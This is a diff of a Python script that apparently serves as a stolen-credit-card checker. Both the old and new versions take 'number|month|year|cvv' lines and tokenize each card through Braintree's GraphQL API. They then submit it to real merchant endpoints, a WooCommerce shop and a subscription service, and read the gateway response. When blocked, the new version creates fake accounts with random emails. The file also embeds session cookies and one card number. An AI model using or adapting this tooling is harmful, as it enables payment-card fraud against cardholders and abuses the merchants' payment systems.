@@ -1,225 +1,188 @@
-import requests,re,random,time,string,base64
-from bs4 import BeautifulSoup
+import requests,re
+import random
+def Tele(ccx):
+	import requests
+	ccx=ccx.strip()
+	n = ccx.split("|")[0]
+	mm = ccx.split("|")[1]
+	yy = ccx.split("|")[2]
+	cvc = ccx.split("|")[3]
+	if "20" in yy:#Mo3gza
+		yy = yy.split("20")[1]
+	text = requests.post('https://t.me/heya2/87').text
+	lines = text.split('\n')
 
-def Tele(cx):
-    cc = cx.split("|")[0]
-    bin=cc[:6]
-    mes = cx.split("|")[1]
-    ano = cx.split("|")[2]
-    cvv = cx.split("|")[3]
-    if "20" in ano:
-        ano = ano.split("20")[1]
-    r=requests.session()
-    heaf={
-    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
-}
-    get=r.get("https://www.woolroots.com/my-account/",headers=heaf)
-    login=re.findall(r'name="woocommerce-login-nonce" value="(.*?)"',get.text)[0]
-    headers = {
-    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-    'Cache-Control': 'max-age=0',
-    'Connection': 'keep-alive',
-    'Content-Type': 'application/x-www-form-urlencoded',
-    # 'Cookie': '_swa_u=b9fa3c37-b33e-484c-a01c-859ac552137a; cmplz_consented_services=; cmplz_policy_id=12; cmplz_marketing=allow; cmplz_statistics=allow; cmplz_preferences=allow; cmplz_functional=allow; cmplz_banner-status=dismissed; nm-wishlist-ids=[]; wordpress_test_cookie=WP+Cookie+check',
-    'Origin': 'https://www.woolroots.com',
-    'Referer': 'https://www.woolroots.com/my-account/',
-    'Sec-Fetch-Dest': 'document',
-    'Sec-Fetch-Mode': 'navigate',
-    'Sec-Fetch-Site': 'same-origin',
-    'Sec-Fetch-User': '?1',
-    'Upgrade-Insecure-Requests': '1',
-    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
-    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-}
-
-    data = {
-    'username': 'lagxdpp828383992929',
-    'password': 'LAGXDOP90"',
-    'woocommerce-login-nonce': login,
-    '_wp_http_referer': '/my-account/',
-    'login': 'Log in',
-}
-
-    response = r.post('https://www.woolroots.com/my-account/', headers=headers, data=data)
-
-    headers = {
-    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-    'Cache-Control': 'max-age=0',
-    'Connection': 'keep-alive',
-    # 'Cookie': '_swa_u=b9fa3c37-b33e-484c-a01c-859ac552137a; cmplz_consented_services=; cmplz_policy_id=12; cmplz_marketing=allow; cmplz_statistics=allow; cmplz_preferences=allow; cmplz_functional=allow; cmplz_banner-status=dismissed; nm-wishlist-ids=[]; wordpress_test_cookie=WP+Cookie+check; _lscache_vary=3bd3b5fb94aa2fbc2bfac3d9be19d32b; wordpress_logged_in_ee0ffb447a667c514b93ba95d290f221=mhemen673%7C1692805914%7CYVkcV8SYq7lMAZbqxiqqUxOZhd07yvLmDI093fqxG1y%7Ce6459d16e0ca6a92d4ad5f1a11dce3ebbfdebf509d4aea3596cf4b13c69e83e9',
-    'Referer': 'https://www.woolroots.com/my-account/add-payment-method/',
-    'Sec-Fetch-Dest': 'document',
-    'Sec-Fetch-Mode': 'navigate',
-    'Sec-Fetch-Site': 'same-origin',
-    'Sec-Fetch-User': '?1',
-    'Upgrade-Insecure-Requests': '1',
-    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
-    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-}
-
-    response = r.get('https://www.woolroots.com/my-account/add-payment-method/',headers=headers)
-#print(response.text)
-    no=re.findall(r'"client_token_nonce":"(.*?)"',response.text)[0]
-    cookies = {
-    'wordpress_sec_ee0ffb447a667c514b93ba95d290f221': 'mhemen673%7C1692805914%7CYVkcV8SYq7lMAZbqxiqqUxOZhd07yvLmDI093fqxG1y%7C868703aa5b50efdaf3ffc942cec7a4b4fca527b74db6e549b83eeeb00e469ba6',
-    '_swa_u': 'b9fa3c37-b33e-484c-a01c-859ac552137a',
-    'cmplz_consented_services': '',
-    'cmplz_policy_id': '12',
-    'cmplz_marketing': 'allow',
-    'cmplz_statistics': 'allow',
-    'cmplz_preferences': 'allow',
-    'cmplz_functional': 'allow',
-    'cmplz_banner-status': 'dismissed',
-    'nm-wishlist-ids': '[]',
-    'wordpress_test_cookie': 'WP+Cookie+check',
-    '_lscache_vary': '3bd3b5fb94aa2fbc2bfac3d9be19d32b',
-    'wordpress_logged_in_ee0ffb447a667c514b93ba95d290f221': 'mhemen673%7C1692805914%7CYVkcV8SYq7lMAZbqxiqqUxOZhd07yvLmDI093fqxG1y%7Ce6459d16e0ca6a92d4ad5f1a11dce3ebbfdebf509d4aea3596cf4b13c69e83e9',
-}
-
-    headers = {
-    'Accept': '*/*',
-    'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-    'Connection': 'keep-alive',
-    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-    # 'Cookie': 'wordpress_sec_ee0ffb447a667c514b93ba95d290f221=mhemen673%7C1692805914%7CYVkcV8SYq7lMAZbqxiqqUxOZhd07yvLmDI093fqxG1y%7C868703aa5b50efdaf3ffc942cec7a4b4fca527b74db6e549b83eeeb00e469ba6; _swa_u=b9fa3c37-b33e-484c-a01c-859ac552137a; cmplz_consented_services=; cmplz_policy_id=12; cmplz_marketing=allow; cmplz_statistics=allow; cmplz_preferences=allow; cmplz_functional=allow; cmplz_banner-status=dismissed; nm-wishlist-ids=[]; wordpress_test_cookie=WP+Cookie+check; _lscache_vary=3bd3b5fb94aa2fbc2bfac3d9be19d32b; wordpress_logged_in_ee0ffb447a667c514b93ba95d290f221=mhemen673%7C1692805914%7CYVkcV8SYq7lMAZbqxiqqUxOZhd07yvLmDI093fqxG1y%7Ce6459d16e0ca6a92d4ad5f1a11dce3ebbfdebf509d4aea3596cf4b13c69e83e9',
-    'Origin': 'https://www.woolroots.com',
-    'Referer': 'https://www.woolroots.com/my-account/add-payment-method/',
-    'Sec-Fetch-Dest': 'empty',
-    'Sec-Fetch-Mode': 'cors',
-    'Sec-Fetch-Site': 'same-origin',
-    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
-    'X-Requested-With': 'XMLHttpRequest',
-    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-}
-
-    data = {
-    'action': 'wc_braintree_credit_card_get_client_token',
-    'nonce': no,
-}
-
-    response = r.post('https://www.woolroots.com/wp-admin/admin-ajax.php', headers=headers, data=data)
-    #print(response.text)
-    token=re.findall(r'"data":"(.*?)"',response.text)[0]
-    encoded_text = token
-    decoded_text = base64.b64decode(encoded_text).decode('utf-8')
-    au=re.findall(r'"authorizationFingerprint":"(.*?)"',decoded_text)[0]
-    #print(au)
-    headers = {
-    'authority': 'payments.braintree-api.com',
-    'accept': '*/*',
-    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-    'authorization': f'Bearer {au}',
-    'braintree-version': '2018-05-10',
-    'content-type': 'application/json',
-    'origin': 'https://assets.braintreegateway.com',
-    'referer': 'https://assets.braintreegateway.com/',
-    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-fetch-dest': 'empty',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'cross-site',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
-}
-
-    json_data = {
-    'clientSdkMetadata': {
-        'source': 'client',
-        'integration': 'custom',
-        'sessionId': '89d615c6-0350-481e-a35e-863af6c62f3e',
-    },
-    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
-    'variables': {
-        'input': {
-            'creditCard': {
-                'number': cc,
-                'expirationMonth': mes,
-                'expirationYear': ano,
-                'cvv': cvv,
-            },
-            'options': {
-                'validate': False,
-            },
-        },
-    },
-    'operationName': 'TokenizeCreditCard',
-}
-
-    response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
-    token=response.json()['data']['tokenizeCreditCard']['token']
-    gh={
-    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
-}
-    ges=r.get("https://www.woolroots.com/my-account/add-payment-method/",headers=gh)
-    pay=re.findall(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"',ges.text)[0]
-    cookies = {
-    '_swa_u': 'b9fa3c37-b33e-484c-a01c-859ac552137a',
-    'cmplz_consented_services': '',
-    'cmplz_policy_id': '12',
-    'cmplz_marketing': 'allow',
-    'cmplz_statistics': 'allow',
-    'cmplz_preferences': 'allow',
-    'cmplz_functional': 'allow',
-    'cmplz_banner-status': 'dismissed',
-    'nm-wishlist-ids': '[]',
-    'wordpress_test_cookie': 'WP+Cookie+check',
-    '_lscache_vary': '3bd3b5fb94aa2fbc2bfac3d9be19d32b',
-    'wordpress_logged_in_ee0ffb447a667c514b93ba95d290f221': 'mhemen673%7C1692805914%7CYVkcV8SYq7lMAZbqxiqqUxOZhd07yvLmDI093fqxG1y%7Ce6459d16e0ca6a92d4ad5f1a11dce3ebbfdebf509d4aea3596cf4b13c69e83e9',
-}
-
-    headers = {
-    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-    'Cache-Control': 'max-age=0',
-    'Connection': 'keep-alive',
-    'Content-Type': 'application/x-www-form-urlencoded',
-    # 'Cookie': '_swa_u=b9fa3c37-b33e-484c-a01c-859ac552137a; cmplz_consented_services=; cmplz_policy_id=12; cmplz_marketing=allow; cmplz_statistics=allow; cmplz_preferences=allow; cmplz_functional=allow; cmplz_banner-status=dismissed; nm-wishlist-ids=[]; wordpress_test_cookie=WP+Cookie+check; _lscache_vary=3bd3b5fb94aa2fbc2bfac3d9be19d32b; wordpress_logged_in_ee0ffb447a667c514b93ba95d290f221=mhemen673%7C1692805914%7CYVkcV8SYq7lMAZbqxiqqUxOZhd07yvLmDI093fqxG1y%7Ce6459d16e0ca6a92d4ad5f1a11dce3ebbfdebf509d4aea3596cf4b13c69e83e9',
-    'Origin': 'https://www.woolroots.com',
-    'Referer': 'https://www.woolroots.com/my-account/add-payment-method/',
-    'Sec-Fetch-Dest': 'document',
-    'Sec-Fetch-Mode': 'navigate',
-    'Sec-Fetch-Site': 'same-origin',
-    'Sec-Fetch-User': '?1',
-    'Upgrade-Insecure-Requests': '1',
-    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
-    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-}
-
-    data = {
-    'payment_method': 'braintree_credit_card',
-    'wc-braintree-credit-card-card-type': 'visa',
-    'wc-braintree-credit-card-3d-secure-enabled': '',
-    'wc-braintree-credit-card-3d-secure-verified': '',
-    'wc-braintree-credit-card-3d-secure-order-total': '0.00',
-    'wc_braintree_credit_card_payment_nonce': token,
-    'wc_braintree_device_data': '{"correlation_id":"5d4a458e9fb8b6cd05da33e61448f27a"}',
-    'wc-braintree-credit-card-tokenize-payment-method': 'true',
-    'woocommerce-add-payment-method-nonce': pay,
-    '_wp_http_referer': '/my-account/add-payment-method/',
-    'woocommerce_add_payment_method': '1',
-}
-
-    time.sleep(25)
-    response = r.post('https://www.woolroots.com/my-account/add-payment-method/', headers=headers, data=data)
-    soup = BeautifulSoup(response.text, 'html.parser')
-    try:  
-      msg = soup.find('i', class_='nm-font nm-font-close').parent.text.strip()
-    except:
-      return "Status code avs: Gateway Rejected: avs"
-    try:
-    	if "Status code avs: Gateway Rejected: avs" in msg:
-    		return msg
-    except:
-    	return "Status code avs:"
-    else:
-    	return msg
+	for line in lines:
+	    if 'eyJ' in line:
+	        jwt_value = line.split('content="')[1].rstrip('">')
+	headers = {
+	    'authority': 'payments.braintree-api.com',
+	    'accept': '*/*',
+	    'accept-language': 'en-US,en;q=0.9',
+	    'authorization': f'Bearer {jwt_value}',
+	    'braintree-version': '2018-05-10',
+	    'content-type': 'application/json',
+	    'origin': 'https://assets.braintreegateway.com',
+	    'referer': 'https://assets.braintreegateway.com/',
+	    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
+	    'sec-fetch-dest': 'empty',
+	    'sec-fetch-mode': 'cors',
+	    'sec-fetch-site': 'cross-site',
+	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
+	}
+	
+	json_data = {
+	    'clientSdkMetadata': {
+	        'source': 'client',
+	        'integration': 'dropin2',
+	        'sessionId': '1d98f8cc-9816-4752-aed1-9eeb5c82e259',
+	    },
+	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
+	    'variables': {
+	        'input': {
+	            'creditCard': {
+	                'number': n,
+	                'expirationMonth': mm,
+	                'expirationYear': yy,
+	            },
+	            'options': {
+	                'validate': False,
+	            },
+	        },
+	    },
+	    'operationName': 'TokenizeCreditCard',
+	}
+	
+	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
+	
+	# Note: json_data will not be serialized by requests
+	# exactly as it was in the original request.
+	#data = '{"clientSdkMetadata":{"source":"client","integration":"dropin2","sessionId":"1d98f8cc-9816-4752-aed1-9eeb5c82e259"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"4347697098903237","expirationMonth":"10","expirationYear":"2027"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
+	#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)
+	id=(response.json()['data']['tokenizeCreditCard']['token'])
+	import requests
+	
+	cookies = {
+	    'ubvt': 'v2%7C2ba97423-383e-40b0-843a-5477765d2f1f%7Cb912631f-c46c-4f18-83d4-9e41082189ff%3Ah%3Adta',
+	    '_gid': 'GA1.2.814726812.1694242964',
+	    '_fbp': 'fb.1.1694242967974.983240925',
+	    '_ga_ZGNNGVH9M1': 'GS1.1.1694243139.1.1.1694243172.0.0.0',
+	    '_ga': 'GA1.2.1791950045.1694242964',
+	    '_ga_C79D1G78LE': 'GS1.2.1694242979.1.1.1694243288.60.0.0',
+	    '_ga_MKJ77D5EMY': 'GS1.2.1694242979.1.1.1694243288.60.0.0',
+	}
+	with open("data.txt", "r") as file:
+		first_line = file.readline().strip()
+	headers = {
+	    'Accept': 'application/json, text/plain, */*',
+	    'Accept-Language': 'en-US,en;q=0.9',
+	    'Authorization': f'JWT {first_line}',
+	    'Connection': 'keep-alive',
+	    'Content-Type': 'application/json;charset=UTF-8',
+	    # 'Cookie': 'ubvt=v2%7C2ba97423-383e-40b0-843a-5477765d2f1f%7Cb912631f-c46c-4f18-83d4-9e41082189ff%3Ah%3Adta; _gid=GA1.2.814726812.1694242964; _fbp=fb.1.1694242967974.983240925; _ga_ZGNNGVH9M1=GS1.1.1694243139.1.1.1694243172.0.0.0; _ga=GA1.2.1791950045.1694242964; _ga_C79D1G78LE=GS1.2.1694242979.1.1.1694243288.60.0.0; _ga_MKJ77D5EMY=GS1.2.1694242979.1.1.1694243288.60.0.0',
+	    'Origin': 'https://island.octalysisprime.com',
+	    'Referer': 'https://island.octalysisprime.com/',
+	    'Sec-Fetch-Dest': 'empty',
+	    'Sec-Fetch-Mode': 'cors',
+	    'Sec-Fetch-Site': 'same-origin',
+	    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
+	    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+	    'sec-ch-ua-mobile': '?0',
+	    'sec-ch-ua-platform': '"Linux"',
+	}
+	
+	json_data = {
+	    'nonce': id,
+	    'subscriptionPeriod': 'm',
+	}
+	
+	response = requests.post(
+	    'https://island.octalysisprime.com/api/subscription/upgrade-account',
+	    cookies=cookies,
+	    headers=headers,
+	    json=json_data,
+	)
+	print(response.json())
+	try:
+		ii=response.json()['resultSub']['message']
+		
+	except:
+		cookies = {
+		    'ubvt': 'v2%7C7b40d9fc-069d-4085-bda4-2883ef00626c%7Cb912631f-c46c-4f18-83d4-9e41082189ff%3Ag%3Adta',
+		    '_ga': 'GA1.2.92482062.1694275871',
+		    '_gid': 'GA1.2.1931131421.1694275871',
+		    '_fbp': 'fb.1.1694275891669.542354229',
+		    '_ga_C79D1G78LE': 'GS1.2.1694275874.1.1.1694276044.60.0.0',
+		    '_gat_UA-572462-8': '1',
+		    '_ga_MKJ77D5EMY': 'GS1.2.1694275889.1.1.1694276496.60.0.0',
+		}
+		
+		headers = {
+		    'Accept': 'application/json, text/plain, */*',
+		    'Accept-Language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
+		    'Connection': 'keep-alive',
+		    'Content-Type': 'application/json;charset=UTF-8',
+		    # 'Cookie': 'ubvt=v2%7C7b40d9fc-069d-4085-bda4-2883ef00626c%7Cb912631f-c46c-4f18-83d4-9e41082189ff%3Ag%3Adta; _ga=GA1.2.92482062.1694275871; _gid=GA1.2.1931131421.1694275871; _fbp=fb.1.1694275891669.542354229; _ga_C79D1G78LE=GS1.2.1694275874.1.1.1694276044.60.0.0; _gat_UA-572462-8=1; _ga_MKJ77D5EMY=GS1.2.1694275889.1.1.1694276496.60.0.0',
+		    'Origin': 'https://island.octalysisprime.com',
+		    'Referer': 'https://island.octalysisprime.com/',
+		    'Sec-Fetch-Dest': 'empty',
+		    'Sec-Fetch-Mode': 'cors',
+		    'Sec-Fetch-Site': 'same-origin',
+		    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
+		    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+		    'sec-ch-ua-mobile': '?0',
+		    'sec-ch-ua-platform': '"Linux"',
+		}
+		random_number = random.randint(1800, 100888)
+		json_data = {
+		    'firstName': 'cbxhs',
+		    'lastName': 'bjdj',
+		    'email': f'g{random_number}y@gmail.com',
+		    'password': 'response.json()',
+		    'referralCode': None,
+		    'freemiumShipName': 'Dawn Treader',
+		    'fromUdemy': False,
+		    'usingMobile': True,
+		    'pathObjective': None,
+		}
+		
+		response = requests.post(
+		    'https://island.octalysisprime.com/api/user/freemium-sign-up',
+		    cookies=cookies,
+		    headers=headers,
+		    json=json_data,
+		)
+		
+		# Note: json_data will not be serialized by requests
+		# exactly as it was in the original request.
+		#data = '{"firstName":"cbxhs","lastName":"bjdj","email":"ggdty@gmail.com","password":"response.json()","referralCode":null,"freemiumShipName":"Dawn Treader","fromUdemy":false,"usingMobile":true,"pathObjective":null}'
+		#response = requests.post(
+		#    'https://island.octalysisprime.com/api/user/freemium-sign-up',
+		#    cookies=cookies,
+		#    headers=headers,
+		#    data=data,
+		#)
+		
+		op=(response.json()['token'])
+		with open("data.txt", "w") as file:
+			file.write(op)
+		return 'success'
+		
+	if 'Funds' in ii:
+		return 'Funds'
+	elif 'success' in ii:
+		return 'success'
+	else:
+		return ii
+	
+	# Note: json_data will not be serialized by requests
+	# exactly as it was in the original request.
+	#data = '{"nonce":"tokencc_bh_tjfrmj_pdcmg3_zgrbgs_nffdtr_c97","subscriptionPeriod":"m"}'
+	#response = requests.post(
+	#    'https://island.octalysisprime.com/api/subscription/upgrade-account',
+	#    cookies=cookies,
+	#    headers=headers,
+	#    data=data,
+	#)
